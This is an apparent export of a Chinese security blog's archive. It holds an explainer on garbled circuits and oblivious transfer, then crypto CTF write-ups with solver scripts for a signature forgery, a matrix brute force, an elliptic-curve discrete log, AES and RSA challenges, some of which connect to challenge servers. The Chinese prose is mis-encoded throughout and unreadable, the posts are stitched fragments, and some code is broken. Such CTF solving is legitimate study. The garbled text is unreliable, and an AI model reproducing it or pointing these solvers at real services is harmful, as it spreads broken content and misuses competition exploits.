éœ€è¿›è¡Œæ•°æ®å½’é›†çš„æƒ…å†µä¸‹ï¼Œå®Œæˆæ•°æ®ååŒè®¡ç®—ï¼ŒåŒæ—¶ä¿æŠ¤æ•°æ®æ‰€æœ‰æ–¹çš„åŸå§‹æ•°æ®éšç§ã€‚å…·ä½“æ¥è¯´ï¼Œæœ‰nä¸ªè®¡ç®—å‚ä¸æ–¹ï¼Œåˆ†åˆ«æŒæœ‰ç§æœ‰æ•°æ®$x_1,x_2x_3,..x_i,$å…±åŒè®¡ç®—æ—¢å®šå‡½æ•°$f(x_1\u0026hellip;x_n)=y$\næ··æ·†ç”µè·¯ï¼ˆGarbled Circuit) # å‰æçŸ¥è¯† # Garbled Circuitæ˜¯MPCçš„ä¸€ç§å®ç°æ–¹å¼ï¼Œç”±å§šæœŸæ™ºå…ˆç”Ÿæå‡ºï¼ˆé‚£æ˜¯çœŸæ»´ç‰›æ‰¹ï¼‰ï¼Œé€šä¿—çš„è¯´ï¼Œå°±æ˜¯ä¸€å †äººå„è‡ªæ‹¥æœ‰å…¶éšç§æ•°æ®ï¼Œä»–ä»¬æƒ³æŠŠè¿™äº›æ•°æ®åˆèµ·æ¥ç®—ç‚¹ä»€ä¹ˆï¼Œä½†åˆä¸æƒ³æŠŠæ•°æ®äº¤ç»™åˆ«äººï¼Œæ··æ·†ç”µè·¯è§£å†³çš„å°±æ˜¯æ­¤ç±»é—®é¢˜ã€‚\nOblivious Transfer ä¸ç»æ„ä¼ è¾“ # Oblivious Transferï¼Œä¸­æ–‡ç§°ä¸ºä¸ç»æ„ä¼ è¾“ï¼Œé€šå¸¸ç®€å†™ä¸ºOT\nå®ƒæŒ‡çš„æ˜¯å‘é€è€…ä»ä¸€ä¸ªå€¼é›†åˆä¸­å‘æ¥æ”¶è€…å‘é€å•ä¸ªå€¼çš„é—®é¢˜ï¼Œè¿™é‡Œå‘é€è€…æ— æ³•çŸ¥é“å‘é€çš„æ˜¯å“ªä¸€ä¸ªå€¼ï¼Œè€Œä¸”æ¥æ”¶è€…ä¹Ÿä¸èƒ½è·çŸ¥é™¤äº†æ¥æ”¶å€¼ä¹‹å¤–çš„å…¶å®ƒä»»ä½•å€¼ã€‚\nå‘é€è€…æœ‰ç”±Nä¸ªå€¼ç»„æˆçš„é›†åˆï¼Œæ¥æ”¶è€…æœ‰ $i$ åè®®æ‰§è¡Œå®Œæˆ,æ¥æ”¶è€…åªçŸ¥é“ $i$ åè®®,ä¸”å‘é€è€…ä¸çŸ¥é“ $i$ åè®®,\nåè®®æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š\nå‘é€è€…ä¸çŸ¥é“æ¥å—è€…è¦é‚£ä¸ª æ¥å—è€…åªèƒ½æˆåŠŸè·å–éœ€è¦çš„é‚£ä¸ªå€¼ è¿™å¼ å›¾å°±å¾ˆçµæ€§\nå§šæ°ç™¾ä¸‡å¯Œç¿é—®é¢˜ è¿™ä¸ªé—®é¢˜çš„è§£æä¾›äº†ä¸€ç§ å°†ä¸¤ä¸ªä¿¡æ¯éšè—åœ¨ä¸åŒ â€œç»´åº¦â€ ä½†åªæœ‰æˆ‘æ‰èƒ½é€šè¿‡æˆ‘ä»¬å…±åŒç”Ÿæˆçš„ä¿¡æ¯ä¸­çŸ¥æ™“é—®é¢˜çš„ç­”æ¡ˆçš„æ¨¡å‹\nMPCçš„ä¸­å¿ƒæ€æƒ³ï¼Œé‚£å°±æ˜¯å½¼æ­¤æŠŠæ•°æ®xï¼Œyè—åœ¨è‡ªå·±çš„ç»´åº¦ä¸Šï¼Œç„¶åæ‰¾åˆ°ä¸€ä¸ªäº¤ç‚¹ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦å…±åŒè®¡ç®—çš„å‡½æ•°fï¼ˆxï¼Œyï¼‰ã€‚Yaoçš„å§šæ°ç™¾ä¸‡å¯Œç¿é—®é¢˜ä»…é™äºæ¯”è¾ƒå¤§å°ï¼Œå³ä¸€ä¸ªå¸ƒå°”å€¼çš„è®¡ç®—ã€‚\nå½“ç„¶åæ¥ä¸€ä¸ªåœ¨æ­¤åŸºç¡€ä¸Šä¸€ä¸ªæ›´åŠ ä¼Ÿå¤§çš„å¯†ç å­¦ç®—æ³•è¢«å‘æ˜å‡ºæ¥äº†ï¼Œé‚£å°±æ··æ·†ç”µè·¯ã€‚å®ƒæŠŠè¿™ä¸ªäº¤ç‚¹æ‰©å±•åˆ°ä»»ä½•ç”µè„‘å¯è®¡ç®—çš„å‡½æ•°ï¼Œä»æ­¤ä¸ç®¡æ˜¯æ¯”è¾ƒå¤§å°ï¼Œè¿˜æ˜¯å¤æ‚åˆ°ç¥ç»ç½‘ç»œï¼Œéƒ½å¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•è®¡ç®—äº†ã€‚\nåº”ç”¨ # åº”ç”¨åˆ°è®¡ç®—æœºä¸Šçš„ä¾‹å­å¯ä»¥ç†è§£ä¸ºæˆ‘æœ‰ä¸€ä¸ª and é—¨ ä¸¤ä¸ªè¾“å…¥ä¸€ä¸ªè¾“å‡º\ntable\nx y z 1 1 1 1 0 0 0 0 0 0 1 0 åŠ å¯†è¿™äº›çœŸå€¼è¡¨å°†ç”µè·¯è½¬æ¢æˆåŠ å¯†ç”µè·¯Garbled Circuit\nè¿™é‡Œtableæ¯ä¸€ä¸ªä½ç½®çš„æ¯ä¸€ç§å€¼éƒ½å¯¹åº”äº†ä¸€ä¸ªkey\nå‡è®¾å®ä¾‹table\nx y z 1 1 0 1 0 1 0 0 0 0 1 0 å®é™…è®¡ç®—ä¸­è¡¨ä¼šç”Ÿæˆå››ä¸ªæ•°æ®\nAliceç”¨è¿™äº›å¯†é’¥åŠ å¯†çœŸå€¼è¡¨ï¼Œå¹¶å°†è¯¥è¡¨æ‰“ä¹±åå‘é€ç»™Bobï¼Œæ¯”å¦‚Aliceçš„è¾“å…¥æ˜¯0ï¼Œé‚£å°±å‘$k_0$ï¼Œè¾“å…¥æ˜¯1å°±å‘ $k_1$\nåŒæ—¶æŠŠå’ŒBobæœ‰å…³çš„keyéƒ½å‘ç»™Bob\nBobæ ¹æ®æ”¶åˆ°çš„ key å¯¹ä¸Šè¿°åŠ å¯†è¡¨ æ ¹æ®è¾“å…¥é€‰æ‹©ä¸€è¡Œè§£å¯†å¹¶æå–å‡ºç›¸åº”çš„kz\nBobå°†kzå‘ç»™Aliceï¼ŒAliceé€šè¿‡å¯¹æ¯”å¾—çŸ¥è®¡ç®—ç»“æœæ˜¯0è¿˜æ˜¯1\n","date":"20 February 2021","permalink":"/achieve/2019to2021/%E5%8F%88%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%8E%A9%E7%9A%84%E4%B8%9C%E8%A5%BF/","section":"archive","summary":"å®‰å…¨å¤šæ–¹è®¡ç®— # å¾ˆé‡è¦çš„è€ä¸œè¥¿äº†ï¼Œä½†åº”ç”¨èŒƒå›´æå…¶å¹¿æ³›ï¼Œä½œä¸ºç§‘æ™®å­¦ä¹ ä¸€ä¸‹è›®å¥½çš„","title":"åˆä¸€ä¸ªå¥½ç©çš„ä¸œè¥¿"},{"content":" è›®æœ‰æ„æ€çš„å°case\nç”¨äº†è’™å“¥é©¬åˆ©æ›²çº¿25519çš„ç­¾åç®—æ³•\næ•´ä¸ªé¢˜çš„æ ¸å¿ƒå†è¿™é‡Œ\nreturn e == hashs(m, s*G + e*P, s*hashp(P) + e*I) é™¤è¦æ±‚è¾“å…¥çš„å‚æ•° e , s å’Œç‚¹ I å¤–å…¶ä»–å‚æ•°éƒ½æ˜¯ç»™å‡ºäº†çš„ï¼Œæ‰€ä»¥éœ€è¦é€‰å–äº‹ç­‰å¼å®ç°çš„e s Iï¼Œä½†hashsæ˜¯å•å‘çš„ æ‰€ä»¥æ„é€ å¸¸è§„çš„ç­‰å¼å¹¶ä¸ç°å®ï¼Œå°†hashså‚æ•°è®¾ä¸º $hashsï¼ˆ m ï¼ŒA ï¼ŒBï¼‰$ è¿›è¡Œæ€è€ƒï¼Œ\nç”±äºæ— æ³•ä»eæ¨åˆ°Aå’ŒB ä¸å¦¨å‡è®¾A Bå·²çŸ¥,å¾—åˆ°\n$e=hashs(m,A,B)$\næœ‰ $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ ä¸å¦¨ä»¤$A= a\\cdot G;,B= b\\cdot G$ å¹¶ä¸”è¾“å…¥çš„ $I$ä¸€å®šåœ¨eccä¸Š\næ•…æœ‰ $$ \\begin{cases} a\\cdot G = s\\cdot G+e\\cdot P\\ b\\cdot G = s\\cdot H_p(p)+e\\cdot I \\end{cases} \\to \\begin{cases} s = a - ex\\ iG=(b\\cdot G-s\\cdot H_p(p))\\cdot e^{-1} \\end{cases} $$ $$e=hashs(m,aG,bG)$$\né‚£ä¹ˆæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯å»æ‰¾aå’Œbäº†\naå’Œbçš„èŒƒå›´è¿˜æœ‰çº¦æŸæ¡ä»¶é™¤äº†æ»¡è¶³eæœ‰é€†å…ƒå¤–å¥½åƒå®Œå…¨æ²¡æœ‰ä»»ä½•å¤´ç»ª,ä½†æ˜¯Gçš„é€‰å–å¸®äº†æˆ‘ä»¬å¤§å¿™\nç”±äºGæ˜¯ç”Ÿæˆå…ƒ,æ‰€ä»¥ä¸ç”¨æ‹…å¿ƒä¼šä¸å­˜åœ¨ä½¿ $$ \\begin{cases} A = s\\cdot G+e\\cdot P\\ B = s\\cdot H_p(p)+e\\cdot I \\end{cases} $$ æˆç«‹çš„$e ,s, I$\nç»éªŒè¯,åªéœ€è¦æ»¡è¶³eèƒ½å¤Ÿå–åˆ°é€†å…ƒå°±okäº†\n# sage # -*- encoding: utf-8 -*- \u0026#39;\u0026#39;\u0026#39; @File : exp_me.sage @Time : 2021/02/10 15:05:20 @Author : ljahum @Contact : roomoflja@gmail.com @Desc : None \u0026#39;\u0026#39;\u0026#39; # code here from os import environ environ[\u0026#39;PWNLIB_NOTERM\u0026#39;] = \u0026#39;True\u0026#39; from pwn import remote from hashlib import sha256 ha = lambda x: x if isinstance(x, int) or isinstance(x, Integer) else product(x.xy()) hashs = lambda *x: int.from_bytes( sha256(b\u0026#39;.\u0026#39;.join([b\u0026#39;%X\u0026#39; % ha(x) for x in x])).digest(), \u0026#39;little\u0026#39;) % p def hashp(x): x = hashs((x)) while True: try: return E.lift_x(x) except: x = hashs((x)) E = EllipticCurve(GF(2 ^ 255 - 19), [0, 486662, 0, 1, 0]) p = E.order() ZmodP = Zmod(p) G = E.lift_x(9) cn = remote(\u0026#39;0.0.0.0\u0026#39;, 10000) data = cn.recvline().decode().strip() print(data) x = int(data.split()[0]) P = x*G m = int(data.split()[-1]) tot =0 while tot \u0026lt;8: a = randint(1, p) b = randint(1, p) aG = a*G bG = b*G e = hashs(m, aG, bG) if not e \u0026amp; 1: print(\u0026#39;try again\u0026#39;) continue s = a - e*x e_inv = inverse_mod(e,p) I = e_inv*(bG - s*hashp(P)) Ix = I.xy()[0] Iy = I.xy()[1] cn.sendlineafter(\u0026#39;I (x): \u0026#39;, str(Ix)) cn.sendlineafter(\u0026#39;I (y): \u0026#39;, str(Iy)) cn.sendlineafter(\u0026#39;e: \u0026#39;, str(e)) cn.sendlineafter(\u0026#39;s: \u0026#39;, str(s)) cn.recvline() tot += 1 print(cn.recvall()) ","date":"16 February 2021","permalink":"/achieve/ctf/catthefish/","section":"archive","summary":"è›®æœ‰æ„æ€çš„å°case","title":"å¾ˆå¤å…¸çš„æ€ç»´catthefish2021"},{"content":"\r*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) ä¸»è¦éš¾ç‚¹åœ¨è¿™é‡Œ\npow(m^q,i**i**i,n)æ— æ³•æ­£å¸¸æ±‚è§£ï¼Œç›´æ¥çœ‹åš7ä¸ªä¸å˜çš„æœªçŸ¥æ•°ï¼Œå¤–åŠ ivï¼Œå°±æ˜¯8ä¸ªä¸å˜çš„æœªçŸ¥æ•°ï¼Œkeystreamçœ‹åšå‘é‡kï¼Œå¯ä»¥æŠŠåŸé¢˜çœ‹åšä»¥ä¸‹çŸ©é˜µ $$\n\\begin{cases} k_1x_1 +\u0026amp; \\cdots \u0026amp; k_7x_7;;+iv=C_1\\\\ k_8x_1 + \u0026amp; \\cdots \u0026amp; k_{14}x_7 ;+iv=C_2\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{113}x_1 +\u0026amp; \\cdots \u0026amp; k_{119}x_7 \\;+iv=C_{17}\\\\ k_{120}x_1 +\u0026amp; \\cdots \u0026amp; k_6x_7\\;\\;\\;+iv;=C_{18}\\\\ k_{7}x_1 +\u0026amp; \\cdots \u0026amp; k_{13}x_7\\;\\;+iv\\;=C_{19}\\\\ \\vdots \\end{cases}\n$$\nå¯¹k1åˆ°k7*8çˆ†ç ´æ˜¯ä¸æ˜æ™ºçš„ï¼Œé€‰å–å…¶ä»–ç­‰å¼ç»„åˆä¸€ä¸‹ï¼Œç›®æ ‡æ˜¯å°½å¯èƒ½ç”¨å°‘çš„kè¦†ç›–å¤šçš„xï¼š $$ \\begin{pmatrix} k_8 \u0026amp; \\cdots \u0026amp; k_{14}\u0026amp;1\\\\ k_7 \u0026amp; \\cdots \u0026amp; k_{13} \u0026amp;1\\\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\\ k_{1}\u0026amp; \\cdots \u0026amp; k_{7} \u0026amp;1 \\end{pmatrix}\n\\begin{pmatrix} x_1\\\\ x_{2}\\\\ \\end{pmatrix}\n\\begin{pmatrix} C_2\\\\ C_{19}\\\\ \\end{pmatrix}\n$$\nè¿™ä¸ªæ—¶å€™å¯¹ K çŸ©é˜µçˆ†ç ´çš„å¤æ‚åº¦åªæœ‰$O(2^{14})$å†™è„šæœ¬è·å–121+ç»„æ•°æ®ä¸€æŠŠæ¢­å“ˆå°±okäº†\næ¥æ”¶æ•°æ®å¹¶å…¨éƒ¨å†™å…¥æ–‡ä»¶\nfrom pwn import *\rfrom hashlib import md5, sha256\rfrom itertools import product\rfrom string import digits, ascii_letters\rfrom icecream import *\rdef getxxxx():\rr.recvuntil(b\u0026#39;xxxx+\u0026#39;)\rbuf = r.recvuntil(b\u0026#39;) \u0026#39;)[:-2]\rs2 = buf\rr.recvuntil(b\u0026#39;= \u0026#39;)\rbuf = r.recvuntil(b\u0026#39;\\\\n\u0026#39;)[:-1]\rhashenc = (buf.decode())\ric(s2, hashenc)\rtab = bytes(digits + ascii_letters, encoding=\u0026#39;utf-8\u0026#39;)\rfor s1 in product(tab, repeat=4):\rdata = bytes(s1) + s2\rhash_data = sha256(data).hexdigest()\rif hash_data == hashenc:\ric(hash_data, hashenc)\rbuf = r.recv(1024)\rprint(buf)\rprint(bytes(s1))\rr.sendline(bytes(s1))\r# buf = r.recv(1024)\r# print(buf)\rreturn bytes(s1)\r# input()\rr = remote( \u0026#39;52.163.228.53\u0026#39;, 8081)\rgetxxxx()\r# r = remote(\u0026#39;0.0.0.0\u0026#39;, 10000)\rf = open(\u0026#39;./è¿œç¨‹è®°å½•çš„å¯†æ–‡.py\u0026#39;, \u0026#39;a\u0026#39;)\rf.seek(0)\rf.truncate()\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\rprint(buf)\rn = int(buf[len(\u0026#39;n: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(n)\rf.write(\u0026#39;n=\u0026#39;+str(n)+\u0026#39;\\\\n\u0026#39;)\rr.sendlines(\u0026#39;0\u0026#39;)\rans = []\rfor i in range(125):\rbuf = r.recvuntil(b\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)\r# print(buf)\rt = int(buf[len(\u0026#39;done: \u0026#39;):-len(\u0026#39;\\\\ngive me a number:\\\\n\u0026#39;)])\rprint(t)\rans.append(t)\rr.sendlines(\u0026#39;0\u0026#39;)\rprint(ans)\rf.write(\u0026#39;enc=[\u0026#39;)\rfor i in ans:\rf.write(str(i)+\u0026#39;,\\\\n\u0026#39;)\rf.write(\u0026#39;]\u0026#39;)\r# input(\u0026#34;æŒ‰ä»»æ„é”®ç»§ç»­\u0026#34;) sageçˆ†ç ´çŸ©é˜µè„šæœ¬\nfrom è¿œç¨‹è®°å½•çš„å¯†æ–‡ import n, enc\rfrom Crypto.Util.number import *\rdef getall(l):\rx = l[:7]\riv = l[7]\rtab = []\rfor i in range(128):\rbin_arr = (bin(i)[2:].rjust(7, \u0026#39;0\u0026#39;))\r# print(bin_arr)\rtemp = 0\rfor j in range(len(bin_arr)):\rtemp += int(bin_arr[j])*x[j]\rtemp += iv\rtemp %= n\r# print(temp)\r# input()\rtab.append(temp)\rflag = \u0026#39;\u0026#39;\rfor i in enc:\r# print(tab.index(i))\rflag += bin(tab.index(i))[2:].rjust(7, \u0026#39;0\u0026#39;)\rflag = flag[:120]\rflag = (int(flag, 2))\rprint(long_to_bytes(flag))\rdef get_x(c, m, _):\r# çŸ©é˜µè¡Œåˆ—åŒ–\r# x = [[i]for i in x]\rc = [[i] for i in c]\rm = m[::-1]\rc = Matrix(Zmod(n), c)\rm = Matrix(Zmod(n), m)\rx1 = (m.inverse()*c)\r# print(x1)\rl = []\rfor i in x1:\rl.append(i[0])\rgetall(l)\rc = []\rfor i in range(8):\rj = i*17+2\rc.append(enc[j-1])\rfor _ in range(0x4000):\rkey = bin(_)[2:].rjust(14, \u0026#39;0\u0026#39;)\r# key = \u0026#39;00101010010000\u0026#39;\rm = []\rl = []\rfor i in range(8):\rfor j in range(i, i+7):\r# print(j,end=\u0026#39; \u0026#39;)\rl.append(int(key[j]))\rl.append(1)\rm.append(l)\rl = []\r# for i in m:\r# print(i)\r# ============\r# get_x(c, m, _)\rtry:\rget_x(c, m, _)\rexcept:\rcontinue\r# *CTF{yOuG0t1T!} myCurve # äºŒå…ƒçˆ±å¾·åå…¹æ›²çº¿ï¼ˆBinary Edwards Curvesï¼‰\nåæ­£ğŸ§“ä¹Ÿæ²¡æ‰“ç®—å¤§äºŒå®Œå…¨ææ˜ç™½è¿™ç§æ•°å­¦ğŸ‘´ç©çš„ç©æ„\nsage\nfrom Crypto.Util.number import * def To_Birational(point): x, y = point return (3*(x+y)) / (x*y + x + y), 3*(x / (x*y+x+y) + 2) F=GF(2**100) R.\u0026lt;x,y\u0026gt;=F[] d1=F.fetch_int(1) d2=F.fetch_int(1) x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L) G=(F.fetch_int(x),F.fetch_int(y)) x, y = (403494114976379491717836688842L, 915160228101530700618267188624L) P =(F.fetch_int(x),F.fetch_int(y)) G = To_Birational(G) P = To_Birational(P) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) G = E(G) P = E(P) flag = G.discrete_log(P) print(long_to_bytes(flag)) çˆ±å¾·åæ›²çº¿è¿ç®—åœ¨åŒºå—é“¾ä¸­åº”ç”¨å¹¿æ³›\nlittle case # å…ˆç”¨ç»´çº³è§£pçš„å€¼ï¼Œå†å°è¯•æŠŠ$\\phi(n)$åˆ†è§£ï¼Œç¬é—´å‡ºæ¥ä¸¤ä¸ª4500å·¦å³çš„å€¼å’Œä¸€ä¸ªå¾ˆå¤§çš„è§£ä¸åŠ¨çš„å€¼ï¼Œnctf2019æœ‰ä¸€ä¸ªé¢˜æœ‰è¿™ä¸ªå¼€æ–¹è„šæœ¬ï¼Œè¿™ä¸ªé¢˜ e çš„å¤§å°ç”šè‡³å’Œnctf2019é‚£ä¸ªé¢˜æ˜¯ä¸€æ ·çš„ã€‚ã€‚ã€‚ã€‚\nå½“æ—¶å®Œå…¨æ²¡æœ‰æ³¨æ„åˆ°å»æ£€æŸ¥å‚æ•°é•¿åº¦ã€‚ã€‚ã€‚å¤ªæ‹‰äº†ã€‚ã€‚ã€‚æ»¡è„‘å­LLL\n","date":"5 January 2021","permalink":"/achieve/ctf/starctf/","section":"archive","summary":"*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) ä¸»è¦éš¾ç‚¹åœ¨è¿™é‡Œ","title":"star CTF2021"},{"content":"\rä¸€ä¸ªé€†å‘ # è§£é¢˜æ€è·¯é€æ¸ç¦»è°± \u0026mdash;- pandaos\nmain # from data import sums def tolist(m): l = list(list(m)[0]) return l def xor(a,b): return eval(\u0026#34;%s^%s\u0026#34; % (a, b)) def xorl(a, b): return [xor(a[i],b[i]) for i in range(42)] def slove_flag(enc,m): enc = matrix(42, enc) m = matrix(42, 42, m) flag = m ^ (-1)*enc flag = (tolist(flag.T)) flag = xorl(flag, xordata) return flag xordata = [0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D, 0x0B, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0x0C, 0x79, 0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9, 0x3C, 0x0F, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75, 0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26] enc = [775008, 736965, 579982, 832102, 739711, 689694, 621261, 786007, 687380, 870278, 671072, 705346, 695702, 726075, 693811, 726115, 797388, 839688, 798029, 773858, 732406, 632966, 740936, 775656, 710214, 858672, 686622, 608896, 815068, 521720, 693197, 560581, 885102, 635306, 732285, 770318, 702253, 632762, 839978, 813599, 651986, 875709] print(enc ans=[] for i in range(0x100): try: flag = bytes(slove_flag(enc,sums[i])) print(flag) ans.append(flag) except: continue print(ans) # b\u0026#39;flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448}\u0026#39; data # åˆ©ç”¨srand(x)å‡½æ•°ç”Ÿæˆx=0~0xffçš„æ‰€æœ‰éšæœºæ•°æ•°æ®\næ•°æ®æ¥æºé¸£è°¢ : c0rrsx2@syclover\næ•°æ®ï¼š\rdata.py\n","date":"27 December 2020","permalink":"/achieve/2019to2021/huawei-xctf-sth/","section":"archive","summary":"ä¸€ä¸ªé€†å‘ # è§£é¢˜æ€è·¯é€æ¸ç¦»è°± \u0026mdash;- pandaos","title":"ä¸€ç‚¹å¥½ç©çš„ä¸œè¥¿"},{"content":"åšäº†ä¸€ç‚¹å¾®å°çš„å·¥ä½œ\nwp # çˆ†ç ´ # python\nfrom itertools import product import hashlib import string tab = string.ascii_lowercase + string.digits print(tab) tab = \u0026#39;abcdef0123456789\u0026#39; for i in product(tab,repeat=6): s = \u0026#39;\u0026#39;.join(i) # print(s) broken_flag = \u0026#39;d0g3{71b2b5616\u0026#39;+s[:2]+\u0026#39;2a4639\u0026#39;+s[2:4]+\u0026#39;7d979\u0026#39;+s[4:]+\u0026#39;de964c}\u0026#39; s = bytes(broken_flag, encoding=\u0026#39;utf-8\u0026#39;) ciphier = hashlib.sha256(s).hexdigest() if ciphier == \u0026#39;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a\u0026#39;: print(broken_flag) exit() # d0g3{71b2b5616ee2a4639a07d979ebde964c} aes # get key\nIn [4]: a = 0x7d3424647d3424647d3424647d342464\rIn [5]: b = 0x19044357064341081e5b4901045b5119\rIn [6]: from Crypto.Util.number import *\rIn [7]: long_to_bytes(a^b)\rOut[7]: b'd0g3{welcomeyou}'\rpython\nfrom Crypto.Util.number import * from Crypto.Cipher import AES from itertools import product msg = b\u0026#39;Welcome to this competition, I hope you can have fun today!!!!!!\u0026#39; m = [] for i in range(0,len(msg)-1,16): # print(msg[i: i+16]) m.append(msg[i:i+16]) print(m[i//16]) c4 = b\u0026#39;\u0026lt;\\x97l\\x92\\xaf\\xf4\\tZ#\\xe8\\x85\\xb1\\x95\\x07{f\u0026#39; key = b\u0026#39;d0g3{welcomeyou}\u0026#39; aes = AES.new(key, AES.MODE_ECB) M4 = aes.decrypt(c4) # ----------------------------- c3 = b\u0026#39;\u0026#39; for i in range(16): c3 += bytes([m[3][i]^M4[i]]) print(\u0026#39;c3\u0026#39;,c3) M3 = aes.decrypt(c3) # ----------------------------------------- c2 = b\u0026#39;\u0026#39; for i in range(16): c2 += bytes([m[2][i] ^ M3[i]]) print(\u0026#39;c2\u0026#39;, c2) M2 = aes.decrypt(c2) # --------------------------------- c1 = b\u0026#39;\u0026#39; for i in range(16): c1 += bytes([m[1][i] ^ M2[i]]) print(\u0026#39;c2\u0026#39;, c1) M1 = aes.decrypt(c1) # --------------------------------------- flag = b\u0026#39;\u0026#39; for i in range(16): flag += bytes([m[0][i] ^ M1[i]]) print(\u0026#39;flag\u0026#39;, flag) # aEs_1s_SO0o_e4sY # b\u0026#39;\\xf7f\\xe2A\\xd4\\x1d\\x87Qr\\x97c\\xbe\\xc9\u0026#34;\\xad\\xdf\u0026#39; rsa # challenge1 # from Crypto.Util.number import * from gmpy2 import * hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 # hint1 = 2 * d + 246810 * e * phi e = 54347 m = 2 n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 # 32768 print(pow(m, e*a, n)) \u0026#39;\u0026#39;\u0026#39; for e in range(50000, 65536+50): E = a*e if(e%1000==0): print(e) if pow(m,E,n) == m: print(e) break \u0026#39;\u0026#39;\u0026#39; e = 54347 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 k_ = (e*a-1)//n print(k_) K_ = 364488564875886 h = a*e-1 for k1 in range(K_, K_+0xffff): if(h % k1 == 0): print(k1) print(\u0026#39;phi\u0026#39;, h//k1) # ----------------------------------------------- n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341 hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 phi = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677323144827364421857064114743919112397586714682327717591155281859878332878857637496812871055648464124306714796343117986409422875990360904379592919915948034655684834583955582963750039237702158594138221579562115747934168692201112328903250356981525515082719838720587009453696563480137185036274540174814218515651176 e = 54347 d = 4298016603089542483597241351887133616963086810642235365308002324004030601093655254875842951388303500539234141616526091370008960457210644879673875254010268684516397285320394226203385308757155700948533012423343861339508626943721344573385174040587806327861898850653183080217726965785724943775433346219983458931428497103383883062577219623496568538184452180371700595315860323243090009943680620842452188260283054761747020012268354097333918776896022588008512791625374380691241934242840621257445893290771708557244115630719160459380439474823867892787914640451469658906186018434932447473007312369559582186557910152024338800019 m = 234702123 print(pow(123,e*d,n)) print((pow(c,d,n))) # 234702123 challenge 2 # from Crypto.Util.number import * from gmpy2 import * m = 234702123 # 3 